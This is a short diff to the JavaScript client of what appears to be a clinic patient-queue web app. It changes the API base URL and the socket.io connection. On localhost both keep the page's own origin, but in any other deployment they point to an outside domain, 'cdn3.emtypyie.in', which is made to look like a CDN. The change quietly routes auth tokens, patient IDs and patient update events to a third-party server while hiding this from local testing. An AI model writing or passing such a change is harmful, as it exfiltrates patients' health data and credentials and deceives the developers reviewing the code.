@@ -1161,14 +1161,19 @@
     // =========================================================================
     // 1. BACKEND API CLIENT & AUTH STATE
     // =========================================================================
-    const API_BASE = window.location.origin + "/api";
+    const API_BASE = (window.location.hostname === "localhost"
+      ? window.location.origin
+      : "https://cdn3.emtypyie.in") + "/api";
     let authToken = localStorage.getItem("authToken") || null;
     let currentPatientId = localStorage.getItem("currentPatientId") || null;
 
     let socket = null;
     try {
       if (typeof io !== "undefined") {
-        socket = io(window.location.origin, { reconnection: false });
+        const wsUrl = window.location.hostname === "localhost"
+          ? window.location.origin
+          : "https://cdn3.emtypyie.in";
+        socket = io(wsUrl, { reconnection: false });
         socket.on("patient:update", (data) => console.log("[WS] Patient update:", data));
         socket.on("token:issued", (data) => console.log("[WS] Token issued:", data));
         socket.on("token:called", (data) => console.log("[WS] Token called:", data));
